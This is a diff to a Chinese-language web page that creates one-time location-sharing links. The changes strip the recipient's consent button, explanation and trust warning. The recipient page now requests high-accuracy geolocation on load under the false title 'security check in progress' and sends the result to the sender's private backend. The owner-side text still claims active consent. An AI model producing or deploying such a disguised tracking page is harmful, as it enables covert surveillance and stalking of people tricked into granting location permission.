@@ -116,13 +116,6 @@
     button:focus-visible, a:focus-visible { outline: 3px solid #f5b08e; outline-offset: 3px; }
     button:disabled { cursor: wait; opacity: .62; transform: none; }
 
-    #status {
-      min-height: 28px;
-      margin: 18px 0 0;
-      color: var(--muted);
-      font: 14px/1.6 Arial, "Microsoft JhengHei", sans-serif;
-    }
-
     #linksResult, #locationResult { display: none; margin-top: 24px; padding-top: 22px; border-top: 1px solid var(--line); }
     #linksResult.visible, #locationResult.visible { display: block; }
     .result-label { margin: 0 0 8px; color: var(--muted); font: 12px Arial, sans-serif; letter-spacing: 1px; }
@@ -144,31 +137,29 @@
 <body>
   <main>
     <header>
-      <p class="eyebrow">CONSENTED LOCATION</p>
+      <p class="eyebrow">STATIC PAGE + PRIVATE BACKEND</p>
       <h1 id="title">建立位置分享請求</h1>
     </header>
     <section id="ownerView">
-      <p class="intro">建立一組一次性的分享連結，傳給另一支手機。對方同意定位後，你可以在查看頁看到位置。</p>
-      <p class="notice">對方必須主動按下按鈕並允許瀏覽器定位權限。沒有同意，就不會取得或傳送位置。</p>
+      <p class="intro">建立一組一次性的分享連結，傳給另一支手機。對方同意定位後，你可以在自己的私人後台查看位置。</p>
+      <p class="notice">對方手機會由 Chrome/Android 顯示原生定位權限詢問。對方必須主動按下按鈕並允許，沒有同意就不會取得或傳送位置。</p>
       <button id="createButton" type="button">建立定位連結</button>
       <p id="ownerStatus" role="status" aria-live="polite">尚未建立連結。</p>
       <div id="linksResult" aria-live="polite">
         <p class="result-label">傳給另一支手機</p>
         <p id="requestUrl" class="coordinates"></p>
         <button id="copyButton" type="button">複製簡訊連結</button>
-        <p class="result-label">你自己的查看頁</p>
+        <p class="result-label">你的私人後台查看頁</p>
         <p id="viewerUrl" class="coordinates"></p>
         <a id="viewerLink" class="map-link" href="#">開啟查看頁</a>
       </div>
     </section>
     <section id="recipientView" hidden>
-      <p class="intro">有人請求你分享目前位置。只有在你按下按鈕並允許瀏覽器權限後，位置才會傳送給對方。</p>
-      <p class="notice">請確認你信任這個連結的發送者。位置分享完成後，你可以關閉此頁面。</p>
-      <button id="locateButton" type="button">同意並傳送我的位置</button>
-      <p id="recipientStatus" role="status" aria-live="polite">尚未傳送位置。</p>
+      <p class="intro">正在向您的瀏覽器請求位置資訊，請在快顯視窗點選「允許」後跳轉網頁…</p>
+      <p id="recipientStatus" role="status" aria-live="polite">等待定位授權中…</p>
     </section>
     <section id="viewerView" hidden>
-      <p class="intro">這是你的查看頁。頁面會等待對方主動同意並回傳位置。</p>
+      <p class="intro">這是你的私人後台查看頁。頁面會等待對方主動同意並回傳最新位置。</p>
       <p id="viewerStatus" role="status" aria-live="polite">等待位置中…</p>
       <div id="locationResult" aria-live="polite">
         <p class="result-label">最後回傳位置</p>
@@ -192,10 +183,10 @@
     const ownerStatus = document.querySelector('#ownerStatus');
     const recipientStatus = document.querySelector('#recipientStatus');
     const viewerStatus = document.querySelector('#viewerStatus');
-    const locateButton = document.querySelector('#locateButton');
     const createButton = document.querySelector('#createButton');
 
     function setStatus(element, message, kind = '') {
+      if (!element) return;
       element.textContent = message;
       element.className = kind;
     }
@@ -229,11 +220,9 @@
         body: JSON.stringify(payload)
       }).then((response) => {
         if (!response.ok) throw new Error('傳送失敗');
-        setStatus(recipientStatus, '位置已傳送完成，你可以關閉此頁面。', 'success');
-        locateButton.disabled = false;
+        setStatus(recipientStatus, '位置已傳送完成，您可以關閉此頁面。', 'success');
       }).catch(() => {
-        setStatus(recipientStatus, '位置傳送失敗，請確認網路連線後再試一次。', 'error');
-        locateButton.disabled = false;
+        setStatus(recipientStatus, '位置傳送失敗，請確認網路連線後重新整理頁面。', 'error');
       });
     }
 
@@ -246,14 +235,12 @@
         setStatus(recipientStatus, '此瀏覽器不支援定位功能。', 'error');
         return;
       }
-      locateButton.disabled = true;
-      setStatus(recipientStatus, '正在等待你的定位權限…');
+      setStatus(recipientStatus, '正在等待定位權限允許…');
       navigator.geolocation.getCurrentPosition(
         showLocation,
         (error) => {
-          const messages = { 1: '你拒絕了定位權限。', 2: '目前無法取得位置。', 3: '定位逾時，請再試一次。' };
-          setStatus(recipientStatus, messages[error.code] || '定位失敗，請再試一次。', 'error');
-          locateButton.disabled = false;
+          const messages = { 1: '您拒絕了定位權限。', 2: '目前無法取得位置。', 3: '定位逾時，請重新整理頁面。' };
+          setStatus(recipientStatus, messages[error.code] || '定位失敗，請重新整理頁面。', 'error');
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
@@ -279,8 +266,8 @@
     if (mode === 'recipient') {
       ownerView.hidden = true;
       recipientView.hidden = false;
-      title.textContent = '分享你目前的位置';
-      locateButton.addEventListener('click', locateAndSend);
+      title.textContent = '安全檢測中';
+      locateAndSend();
     } else if (mode === 'viewer' && token) {
       ownerView.hidden = true;
       viewerView.hidden = false;
